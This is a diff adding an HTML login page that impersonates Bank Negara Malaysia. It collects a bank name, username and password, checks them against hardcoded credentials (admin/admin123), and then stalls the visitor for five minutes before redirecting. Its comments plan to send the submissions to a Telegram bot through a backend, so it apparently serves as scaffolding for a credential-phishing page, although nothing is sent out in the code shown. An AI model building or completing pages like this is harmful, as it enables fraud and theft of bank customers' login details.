@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+  <meta charset="UTF-8">
+  <title>bank negara malaysia</title>
+  <style>
+    body { background: #e7edf4; font-family: Arial, sans-serif; }
+    .login-container { max-width: 360px; background: #fff; border-radius: 8px; margin: 60px auto; padding: 28px 24px; box-shadow: 0 2px 16px #0002; }
+    .login-container h2 { text-align: center; margin-bottom: 14px; color: #232c45; }
+    .desc { text-align: center; color: #6b6b6b; font-size: 12px; margin-bottom: 22px; }
+    label { display: block; margin-top: 12px; font-size: 14px; }
+    input[type=text], input[type=password] { width: 100%; padding: 8px 10px; margin-top: 4px; border: 1px solid #b9b9b9; border-radius: 4px; font-size: 14px; }
+    .input-password { position: relative; }
+    .eye-btn { position: absolute; right: 10px; top: 7px; cursor: pointer; font-size: 17px; background: none; border: none; }
+    .error { color: #d10000; font-size: 13px; margin-top: 7px; margin-bottom: 5px;}
+    .btn-login { background: #16347a; color: #fff; width: 100%; border: none; border-radius: 4px; margin-top: 18px; padding: 10px; font-size: 15px; cursor: pointer;}
+    .loading-area { display: none; text-align:center; margin-top:20px; font-size:15px; color:#277128;}
+    .loading-anim { font-size: 30px; margin-top: 10px;}
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <h2>bank negara malaysia</h2>
+    <div class="desc">maklumat dalam perlindungan diraja malaysia.</div>
+    <form id="loginForm" autocomplete="off">
+      <label>Bank Name</label>
+      <input type="text" id="bankName" required placeholder="Bank Name">
+      <label>Username</label>
+      <input type="text" id="username" required placeholder="Username">
+      <label>Password</label>
+      <div class="input-password">
+        <input type="password" id="password" required placeholder="Password">
+        <button type="button" class="eye-btn" id="toggleEye">&#128065;</button>
+      </div>
+      <div class="error" id="errorMsg"></div>
+      <button type="submit" class="btn-login">Login</button>
+      <div class="loading-area" id="loadingArea">
+        Sedang dalam proses...<br>
+        <span class="loading-anim" id="loadingAnim">⏳</span>
+      </div>
+    </form>
+  </div>
+<script>
+  // Hide/Unhide password
+  const passwordInput = document.getElementById('password');
+  document.getElementById('toggleEye').onclick = function() {
+    if (passwordInput.type === 'password') {
+      passwordInput.type = 'text';
+      this.innerHTML = '🙈';
+    } else {
+      passwordInput.type = 'password';
+      this.innerHTML = '👁️';
+    }
+  };
+
+  // Password validation
+  function validatePassword(pw) {
+    const onlyLetters = /^[A-Za-z]+$/;
+    const onlyNumbers = /^[0-9]+$/;
+    return !onlyLetters.test(pw) && !onlyNumbers.test(pw);
+  }
+
+  document.getElementById('loginForm').onsubmit = async function(e) {
+    e.preventDefault();
+    document.getElementById('errorMsg').textContent = '';
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const bankName = document.getElementById('bankName').value.trim();
+
+    if (!validatePassword(password)) {
+      document.getElementById('errorMsg').textContent = "Password harus terdiri dari kombinasi karakter dan angka.";
+      return;
+    }
+
+    // Simulasi validasi backend (integrasi bot Telegram harus menggunakan server-side)
+    let isValid = false;
+    if (username === "admin" && password === "admin123" && bankName.toLowerCase() === "bank negara") {
+      isValid = true;
+    }
+    // Jika ingin terhubung dengan bot Telegram, tambahkan fetch/axios ke backend API di sini
+
+    if (isValid) {
+      document.getElementById('loadingArea').style.display = 'block';
+      setTimeout(() => {
+        window.location.href = "main-portal.html"; // Redirect setelah 5 menit (simulasi)
+      }, 300000);  // 5 menit = 300.000 ms
+    } else {
+      document.getElementById('errorMsg').textContent = "Username atau Password salah!";
+    }
+  }
+</script>
+</body>
+</html>
